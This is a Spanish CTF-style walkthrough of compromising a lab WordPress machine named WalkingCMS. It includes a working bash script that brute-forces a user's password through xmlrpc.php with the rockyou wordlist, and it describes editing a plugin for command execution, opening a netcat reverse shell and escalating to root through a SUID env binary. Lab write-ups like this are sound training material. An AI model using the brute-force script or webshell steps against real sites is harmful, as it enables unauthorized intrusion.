# WalkingCMS

![Image](https://github.com/user-attachments/assets/5b69884b-8ee4-48e0-8540-858643a14838)

## Reconocimiento

Tras comprobar que tenemos conectividad con la máquina procedemos a escanear los puertos que están abiertos con **Nmap**:

![Image](https://github.com/user-attachments/assets/62e1968c-ae48-4917-937d-8e166838c1cc)

En este primer escaneo podemos observar, por un lado que se trata de una máquina Linux (debido al TTL de 64) y por otro que tiene el servicio HTTP activo por el puerto 80.

![Image](https://github.com/user-attachments/assets/de3d102c-2528-49f4-bd74-246f8e2491c9)

En este segundo escaneo obtenemos más información sobre este servicio, como la versión de Apache o la distribución de Linux (en este caso un Debian).

Con la herramienta **WhatWeb** podemos identificar las tecnologías que está utilizando este servicio web, aunque en esta ocasión no nos sirve de mucha ayuda:

![Image](https://github.com/user-attachments/assets/0f9b5813-7821-488d-bd43-d3365a7eb142)

Un primer vistazo a la web nos confirma que esta URL no tiene nada de interés, puesto que se trata del clásico archivo index de apache:

![Image](https://github.com/user-attachments/assets/9f8a5e6b-c074-4f21-ae6c-43459e07bbf9)

Es momento de hacer Fuzzing para identificar directorios expuestos, para lo cual utilizamos **gobuster**:

![Image](https://github.com/user-attachments/assets/d2ba9d3f-a2a8-4bd0-b438-9112ad239a6a)

De esta forma descubrimos que hay un WordPress corriendo:

![Image](https://github.com/user-attachments/assets/9f71ce2f-6113-4be3-9f5d-598dba0804fe)

Toca volver a hacer Fuzzing para descubrir nuevos directorios expuestos y utilizar la herramienta **WpScan** para encontrar posibles vulnerabilidades:

![Image](https://github.com/user-attachments/assets/1f58e48d-e518-47c5-a3fb-3ce54871e7c7)

Como podemos observar en los resultados obtenidos hay una ruta */wp-admin* que contiene un panel de autenticación.

Utilizamos el siguiente comando de **WpScan** (en este caso tengo guardado el token de la app en una variable de entorno por lo que será necesario que configuréis esto para que funcione, sino siempre podéis incluir ahí vuestro token personal):

![Image](https://github.com/user-attachments/assets/42efdba4-a07f-4bc2-a6c1-8df0d3aba2fb)

Tras ejecutar el comando podemos observar tanto un usuario *Mario*, como que el archivo *xmlrpc.php* está expuesto:

![Image](https://github.com/user-attachments/assets/ebcf4952-e42f-4de3-89d2-cad756167d73)

![Image](https://github.com/user-attachments/assets/4a75e2a7-f1bc-477a-aa28-4514b8ce5cac)

Basandonos en la información de la siguiente página [explotación archivo xmlrpc.php](https://nitesculucian.github.io/2019/07/02/exploiting-the-xmlrpc-php-on-all-wordpress-versions/) podemos utilizar este archivo y este usuario para crear un script que nos proporcione la contraseña de dicho usuario. Pero primero realizamos una consulta a la dirección donde se aloja el xmlrpc.php creando un archivo file.xml de prueba (en este caso nos aprovechamos del método wp.getUsersBlogs):

```
 <?xml version="1.0" encoding="UTF-8"?> <methodCall> <methodName>wp.getUsersBlogs</methodName> <params> <param><value>mario</value></param> <param><value>ejemplo</value></param> <
       │ /params> </methodCall>
```

Comprobando el resultado de la respuesta podemos adaptar nuestro script:

![Image](https://github.com/user-attachments/assets/52809f57-5c83-4310-991a-3d3f35de4638)

Por lo que nuestro script quedaría de la siguiente forma:

```Bash
#!/bin/bash

function ctrl_c(){
    echo -e "Saliendo..."
    exit 1
}

trap ctrl_c SIGINT

function createXML(){
    password=$1

    xmlFile="""
<?xml version=\"1.0\" encoding=\"UTF-8\"?>
<methodCall>
<methodName>wp.getUsersBlogs</methodName>
<params>
<param><value>mario</value></param>
<param><value>$password</value></param>
</params>
</methodCall>"""

    echo $xmlFile > file.xml

    response=$(curl -s -X POST "http://172.17.0.2/wordpress/xmlrpc.php" -d@file.xml)

    if [ ! "$(echo $response | grep 'Nombre de usuario o contraseña incorrectos.')" ]; then
        echo -e "\n[+] La contraseña para el usuario mario es $password"
        exit 0
    fi
}

cat /usr/share/wordlists/rockyou.txt | while read password; do
    createXML $password
done
```

Tras ejecutar el script descubrimos que la contraseña para el usuario es *love*

![Image](https://github.com/user-attachments/assets/039c1cb1-1b9c-4254-b7e6-3bbd1ea860f2)

## Explotación

Una vez hemos obtenido las credenciales nos autenticamos en el panel descubierto anteriormente y procedemos a buscar nuevas vulnerabilidades que nos permitan obtener acceso a la máquina. Para ello nos buscamos los plugins instalados y haciendo uso de uno llamado *Akismet* modificamos el código de su archivo *akismet.php* para que nos permita ejecutar comandos:

![Image](https://github.com/user-attachments/assets/70153d0b-4820-4e4b-83ab-68e4d623a68a)

Una vez comprobado que podemos ejecutar comandos como "id" o "whoami" procedemos a entablarnos una reverse shell tras ponernos en escucha con netcat por el puerto 433 (se suele emplear el 443 pero en este caso es una errata):

![Image](https://github.com/user-attachments/assets/333d23fc-acba-4096-9807-4fa005e49275)

## Escalada de privilegios

Tras ganar acceso a la máquina debemos hacer un tratamiento de la tty para poder trabajar de una manera más eficiente y clara. Para esto tendremos que utilizar los siguientes comandos:

- `script /dev/null -c bash`
- ctrl + z (para poner el proceso en segundo plano)
- `stty raw -echo; fg`
- `reset xterm`
- `export TERM=xterm`
- `export SHELL=bash`
- `stty rows x columns y` (donde x e y son las filas y columnas de tu terminal habitual, para comprobarlo utiliza en una consola aparte stty size)

Ahora que estamos en condiciones de proseguir podemos buscar la forma de escalar privilegios, para ello buscamos la presencia de archivos SUID de los que nos podamos aprovechar y encontramos que el binario *env* tiene permiso SUID:

![Image](https://github.com/user-attachments/assets/de3d102c-2528-49f4-bd74-246f8e2491c9)

De esta forma podemos recurrir a páginas como [GTFOBins](https://gtfobins.github.io/) que contemplan diversos archivos de los que nos podemos aprovechar según los permisos que tengan para escalar privilegios. Solamente tendríamos que ejecutar el siguiente comando y nos convertiríamos en *root*.

![Image](https://github.com/user-attachments/assets/fb03c526-d104-45ed-b728-b4c4abbfa002)

Con esto tendríamos control total sobre la máquina.
